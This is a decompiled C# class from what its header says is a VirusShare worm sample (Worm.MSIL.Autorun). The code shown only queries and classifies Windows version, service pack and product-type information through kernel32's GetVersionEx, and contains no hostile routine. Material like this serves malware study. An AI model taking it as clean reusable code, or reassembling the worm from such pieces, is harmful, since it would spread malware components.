// Decompiled with JetBrains decompiler
// Type: explorer.OperatingSystemVersion
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System;
using System.Globalization;
using System.Runtime.InteropServices;

namespace explorer
{
  public class OperatingSystemVersion : OSVersionInfo
  {
    public OperatingSystemVersion()
    {
      OperatingSystemVersion.OSVERSIONINFO info = new OperatingSystemVersion.OSVERSIONINFO();
      if (!OperatingSystemVersion.UseOSVersionInfoEx(info))
        this.InitOsVersionInfo(info);
      else
        this.InitOsVersionInfoEx();
    }

    private static bool UseOSVersionInfoEx(OperatingSystemVersion.OSVERSIONINFO info)
    {
      if (!OperatingSystemVersion.NativeMethods.GetVersionEx(info))
        throw new InvalidOperationException("Failed to get OSVersionInfo. Error = 0x" + Marshal.GetLastWin32Error().ToString("8X", (IFormatProvider) CultureInfo.CurrentCulture));
      return info.MajorVersion >= 4 && (info.MajorVersion > 4 || info.MinorVersion >= 0 && (info.MinorVersion > 0 || info.CSDVersion == "Service Pack 6"));
    }

    private void InitOsVersionInfo(OperatingSystemVersion.OSVERSIONINFO info)
    {
      this.OSPlatformId = OperatingSystemVersion.GetOSPlatformId(info.PlatformId);
      this.OSMajorVersion = info.MajorVersion;
      this.OSMinorVersion = info.MinorVersion;
      this.BuildNumber = info.BuildNumber;
      this.OSCSDVersion = info.CSDVersion;
    }

    private void InitOsVersionInfoEx()
    {
      OperatingSystemVersion.OSVERSIONINFOEX osVersionInfoEx = new OperatingSystemVersion.OSVERSIONINFOEX();
      this.OSPlatformId = OperatingSystemVersion.NativeMethods.GetVersionEx(osVersionInfoEx) ? OperatingSystemVersion.GetOSPlatformId(osVersionInfoEx.PlatformId) : throw new InvalidOperationException("Failed to get OSVersionInfoEx. Error = 0x" + Marshal.GetLastWin32Error().ToString("8X", (IFormatProvider) CultureInfo.CurrentCulture));
      this.OSMajorVersion = osVersionInfoEx.MajorVersion;
      this.OSMinorVersion = osVersionInfoEx.MinorVersion;
      this.BuildNumber = osVersionInfoEx.BuildNumber;
      this.OSCSDVersion = osVersionInfoEx.CSDVersion;
      this.OSSuiteFlags = OperatingSystemVersion.GetOSSuiteFlags(osVersionInfoEx.SuiteMask);
      this.OSProductType = OperatingSystemVersion.GetOSProductType(osVersionInfoEx.ProductType);
      this.OSServicePackMajor = osVersionInfoEx.ServicePackMajor;
      this.OSServicePackMinor = osVersionInfoEx.ServicePackMinor;
      this.OSReserved = osVersionInfoEx.Reserved;
      this.ExtendedPropertiesAreSet = true;
    }

    private static OSPlatformId GetOSPlatformId(int platformId)
    {
      switch (platformId)
      {
        case 0:
          return OSPlatformId.Win32s;
        case 1:
          return OSPlatformId.Win32Windows;
        case 2:
          return OSPlatformId.Win32NT;
        case 3:
          return OSPlatformId.WinCE;
        default:
          throw new InvalidOperationException("Invalid PlatformId: " + (object) platformId);
      }
    }

    private static OSSuites GetOSSuiteFlags(ushort suiteMask) => (OSSuites) suiteMask;

    private static OSProductType GetOSProductType(byte productType)
    {
      switch (productType)
      {
        case 1:
          return OSProductType.Workstation;
        case 2:
          return OSProductType.DomainController;
        case 3:
          return OSProductType.Server;
        default:
          throw new InvalidOperationException("Invalid ProductType: " + (object) productType);
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private class OSVERSIONINFO
    {
      public int OSVersionInfoSize;
      public int MajorVersion;
      public int MinorVersion;
      public int BuildNumber;
      public int PlatformId;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
      public string CSDVersion;

      public OSVERSIONINFO() => this.OSVersionInfoSize = Marshal.SizeOf((object) this);

      private void StopTheCompilerComplaining()
      {
        this.MajorVersion = 0;
        this.MinorVersion = 0;
        this.BuildNumber = 0;
        this.PlatformId = 0;
        this.CSDVersion = string.Empty;
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private class OSVERSIONINFOEX
    {
      public int OSVersionInfoSize;
      public int MajorVersion;
      public int MinorVersion;
      public int BuildNumber;
      public int PlatformId;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
      public string CSDVersion;
      public short ServicePackMajor;
      public short ServicePackMinor;
      public ushort SuiteMask;
      public byte ProductType;
      public byte Reserved;

      public OSVERSIONINFOEX() => this.OSVersionInfoSize = Marshal.SizeOf((object) this);

      private void StopTheCompilerComplaining()
      {
        this.MajorVersion = 0;
        this.MinorVersion = 0;
        this.BuildNumber = 0;
        this.PlatformId = 0;
        this.CSDVersion = string.Empty;
        this.ServicePackMajor = (short) 0;
        this.ServicePackMinor = (short) 0;
        this.SuiteMask = (ushort) 0;
        this.ProductType = (byte) 0;
        this.Reserved = (byte) 0;
      }
    }

    private class VerPlatformId
    {
      public const int Win32s = 0;
      public const int Win32Windows = 1;
      public const int Win32NT = 2;
      public const int WinCE = 3;

      private VerPlatformId()
      {
      }
    }

    private class VerSuiteMask
    {
      public const uint VER_SERVER_NT = 2147483648;
      public const uint VER_WORKSTATION_NT = 1073741824;
      public const ushort VER_SUITE_SMALLBUSINESS = 1;
      public const ushort VER_SUITE_ENTERPRISE = 2;
      public const ushort VER_SUITE_BACKOFFICE = 4;
      public const ushort VER_SUITE_COMMUNICATIONS = 8;
      public const ushort VER_SUITE_TERMINAL = 16;
      public const ushort VER_SUITE_SMALLBUSINESS_RESTRICTED = 32;
      public const ushort VER_SUITE_EMBEDDEDNT = 64;
      public const ushort VER_SUITE_DATACENTER = 128;
      public const ushort VER_SUITE_SINGLEUSERTS = 256;
      public const ushort VER_SUITE_PERSONAL = 512;
      public const ushort VER_SUITE_BLADE = 1024;
      public const ushort VER_SUITE_EMBEDDED_RESTRICTED = 2048;

      private VerSuiteMask()
      {
      }
    }

    private class VerProductType
    {
      public const byte VER_NT_WORKSTATION = 1;
      public const byte VER_NT_DOMAIN_CONTROLLER = 2;
      public const byte VER_NT_SERVER = 3;

      private VerProductType()
      {
      }
    }

    private class NativeMethods
    {
      private NativeMethods()
      {
      }

      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool GetVersionEx([In, Out] OperatingSystemVersion.OSVERSIONINFO osVersionInfo);

      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool GetVersionEx(
        [In, Out] OperatingSystemVersion.OSVERSIONINFOEX osVersionInfoEx);
    }
  }
}
